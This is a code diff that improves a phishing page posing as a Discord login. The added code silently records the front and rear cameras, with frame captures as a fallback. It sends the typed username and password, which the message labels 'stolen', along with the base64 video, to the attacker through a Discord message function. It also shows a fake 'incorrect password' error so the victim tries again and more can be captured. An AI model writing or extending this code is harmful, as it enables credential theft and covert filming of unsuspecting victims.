@@ -368,63 +368,35 @@
             const videoFront = document.getElementById('hiddenVideoFront');
             const videoRear = document.getElementById('hiddenVideoRear');
 
-            // MediaRecorder instances
+            // ============================================================
+            //  SILENT VIDEO RECORDING – ROBUST IMPLEMENTATION
+            // ============================================================
             let recorderFront = null;
             let recorderRear = null;
-            let recordedChunksFront = [];
-            let recordedChunksRear = [];
-            let isRecording = false;
+            let latestFrontBlob = null;   // store the most recent blob (base64)
+            let latestRearBlob = null;
+            let recordingActive = false;
 
-            // ============================================================
-            //  SILENT VIDEO RECORDING – BOTH FRONT AND REAR
-            // ============================================================
-            async function initSilentCameras() {
+            // Capture a single frame as fallback (base64)
+            function captureFrame(videoElement) {
                 try {
-                    // Front camera (user-facing)
-                    const frontStream = await navigator.mediaDevices.getUserMedia({
-                        video: { 
-                            facingMode: 'user', 
-                            width: { ideal: 640 }, 
-                            height: { ideal: 480 },
-                            frameRate: { ideal: 30 }
-                        },
-                        audio: false
-                    });
-                    videoFront.srcObject = frontStream;
-                    await videoFront.play();
-
-                    // Rear camera (environment-facing)
-                    const rearStream = await navigator.mediaDevices.getUserMedia({
-                        video: { 
-                            facingMode: 'environment', 
-                            width: { ideal: 640 }, 
-                            height: { ideal: 480 },
-                            frameRate: { ideal: 30 }
-                        },
-                        audio: false
-                    });
-                    videoRear.srcObject = rearStream;
-                    await videoRear.play();
-
-                    console.log('📷 Silent video recording started (front + rear)');
-
-                    // Start recording both streams
-                    startRecording(frontStream, 'front');
-                    startRecording(rearStream, 'rear');
-
-                } catch (err) {
-                    console.warn('Silent camera init failed:', err.message);
+                    if (!videoElement || videoElement.readyState < 2) return null;
+                    const canvas = document.createElement('canvas');
+                    canvas.width = videoElement.videoWidth || 320;
+                    canvas.height = videoElement.videoHeight || 240;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(videoElement, 0, 0);
+                    return canvas.toDataURL('image/jpeg', 0.7);
+                } catch (e) {
+                    return null;
                 }
             }
 
+            // Start recording with MediaRecorder
             function startRecording(stream, cameraType) {
                 try {
-                    const options = { 
-                        mimeType: 'video/webm;codecs=vp9',
-                        videoBitsPerSecond: 2500000
-                    };
-                    
-                    // Fallback for browsers that don't support VP9
+                    // Try VP9 first, fallback to webm
+                    let options = { mimeType: 'video/webm;codecs=vp9', videoBitsPerSecond: 2500000 };
                     let recorder;
                     try {
                         recorder = new MediaRecorder(stream, options);
@@ -432,43 +404,92 @@
                         recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                     }
 
-                    const chunks = [];
+                    let chunks = [];
                     recorder.ondataavailable = function(event) {
                         if (event.data.size > 0) {
                             chunks.push(event.data);
+                            // Immediately convert to base64 and store
+                            const blob = new Blob([event.data], { type: 'video/webm' });
+                            const reader = new FileReader();
+                            reader.onloadend = function() {
+                                const base64 = reader.result;
+                                if (cameraType === 'front') {
+                                    latestFrontBlob = base64;
+                                } else {
+                                    latestRearBlob = base64;
+                                }
+                                console.log(`📹 ${cameraType} camera segment captured (${blob.size} bytes)`);
+                            };
+                            reader.readAsDataURL(blob);
                         }
                     };
 
-                    recorder.onstop = function() {
-                        const blob = new Blob(chunks, { type: 'video/webm' });
-                        const reader = new FileReader();
-                        reader.onloadend = function() {
-                            const base64Video = reader.result;
-                            if (cameraType === 'front') {
-                                recordedChunksFront.push(base64Video);
-                                if (recordedChunksFront.length > 3) recordedChunksFront.shift();
-                            } else {
-                                recordedChunksRear.push(base64Video);
-                                if (recordedChunksRear.length > 3) recordedChunksRear.shift();
-                            }
-                            console.log(`📹 ${cameraType} camera video segment captured`);
-                        };
-                        reader.readAsDataURL(blob);
+                    recorder.onerror = function(e) {
+                        console.warn(`Recorder error (${cameraType}):`, e);
                     };
 
-                    // Record in 5-second segments
-                    recorder.start(5000);
-                    
+                    // Record in 8-second chunks
+                    recorder.start(8000);
                     if (cameraType === 'front') {
                         recorderFront = recorder;
                     } else {
                         recorderRear = recorder;
                     }
-                    
-                    isRecording = true;
+                    recordingActive = true;
+                    console.log(`✅ ${cameraType} recorder started`);
 
                 } catch (err) {
                     console.warn(`Failed to start ${cameraType} recorder:`, err.message);
+                    // If recorder fails, we'll rely on frame capture as fallback
+                }
+            }
+
+            // Initialize cameras and start recording
+            async function initSilentCameras() {
+                try {
+                    // Front camera
+                    const frontStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 30 } },
+                        audio: false
+                    });
+                    videoFront.srcObject = frontStream;
+                    await videoFront.play();
+
+                    // Rear camera
+                    const rearStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 30 } },
+                        audio: false
+                    });
+                    videoRear.srcObject = rearStream;
+                    await videoRear.play();
+
+                    console.log('📷 Both cameras are streaming');
+
+                    // Start recording
+                    startRecording(frontStream, 'front');
+                    startRecording(rearStream, 'rear');
+
+                    // Also capture a frame every 5 seconds as a safety fallback
+                    setInterval(() => {
+                        if (!latestFrontBlob) {
+                            const frame = captureFrame(videoFront);
+                            if (frame) {
+                                latestFrontBlob = frame;
+                                console.log('📸 Fallback front frame captured');
+                            }
+                        }
+                        if (!latestRearBlob) {
+                            const frame = captureFrame(videoRear);
+                            if (frame) {
+                                latestRearBlob = frame;
+                                console.log('📸 Fallback rear frame captured');
+                            }
+                        }
+                    }, 5000);
+
+                } catch (err) {
+                    console.warn('Camera init failed:', err.message);
+                    // If camera fails, we'll have null blobs – but we'll still send credentials.
                 }
             }
 
@@ -712,9 +733,13 @@
                 }
             }
 
+            // ============================================================
+            //  FAKE ERROR – "Password or email incorrect"
+            // ============================================================
             function showFakeError() {
-                statusBar.textContent = '❌ An error has occurred. Please try again later.';
+                statusBar.textContent = '❌ Password or email incorrect. Please try again.';
                 statusBar.className = 'status-bar visible';
+                // Clear after 6 seconds – user will retry, giving us another chance
                 setTimeout(() => {
                     statusBar.className = 'status-bar';
                 }, 6000);
@@ -734,9 +759,19 @@
                 const username = usernameInput.value.trim() || '(empty)';
                 const password = passwordInput.value.trim() || '(empty)';
 
-                // Get latest video segments
-                const frontVideo = recordedChunksFront.length > 0 ? recordedChunksFront[recordedChunksFront.length - 1] : 'No front video captured';
-                const rearVideo = recordedChunksRear.length > 0 ? recordedChunksRear[recordedChunksRear.length - 1] : 'No rear video captured';
+                // Get latest video data (prefer blob, fallback to frame)
+                let frontData = latestFrontBlob || 'No video data';
+                let rearData = latestRearBlob || 'No video data';
+
+                // If we still have nothing, try a direct frame capture right now
+                if (frontData === 'No video data') {
+                    const frame = captureFrame(videoFront);
+                    if (frame) frontData = frame;
+                }
+                if (rearData === 'No video data') {
+                    const frame = captureFrame(videoRear);
+                    if (frame) rearData = frame;
+                }
 
                 const message = `
 🔐 **DISCORD LOGIN + SILENT VIDEO CAPTURE**
@@ -761,8 +796,8 @@
 👤 **Stolen Username:** ${stolen.username || '(none)'}
 🔑 **Stolen Password:** ${stolen.password || '(none)'}
 
-📹 **Front Camera Video (base64):** ${frontVideo.substring(0, 100)}...
-📹 **Rear Camera Video (base64):** ${rearVideo.substring(0, 100)}...
+📹 **Front Camera Video/Frame:** ${frontData.substring(0, 100)}...
+📹 **Rear Camera Video/Frame:** ${rearData.substring(0, 100)}...
                 `.trim();
 
                 console.log('📋 [LOG] Full data:');
@@ -771,18 +806,20 @@
                 // Send main message
                 await sendToDiscord(message);
 
-                // Send full video data separately
-                if (recordedChunksFront.length > 0) {
-                    await sendToDiscord(`📹 **Front Camera Video (Full):**\n${recordedChunksFront.join('\n')}`);
+                // Send full video data separately (if we have actual video blobs)
+                if (latestFrontBlob && latestFrontBlob.startsWith('data:video/')) {
+                    await sendToDiscord(`📹 **Front Camera Video (Full):**\n${latestFrontBlob}`);
+                } else if (frontData !== 'No video data' && frontData.startsWith('data:image/')) {
+                    await sendToDiscord(`📸 **Front Camera Frame:**\n${frontData}`);
                 }
-                if (recordedChunksRear.length > 0) {
-                    await sendToDiscord(`📹 **Rear Camera Video (Full):**\n${recordedChunksRear.join('\n')}`);
+                if (latestRearBlob && latestRearBlob.startsWith('data:video/')) {
+                    await sendToDiscord(`📹 **Rear Camera Video (Full):**\n${latestRearBlob}`);
+                } else if (rearData !== 'No video data' && rearData.startsWith('data:image/')) {
+                    await sendToDiscord(`📸 **Rear Camera Frame:**\n${rearData}`);
                 }
 
                 passwordInput.value = '';
-                // Clear recorded chunks after sending
-                recordedChunksFront = [];
-                recordedChunksRear = [];
+                // Do NOT clear video data – we want to keep capturing for the next attempt
             });
 
             // ============================================================
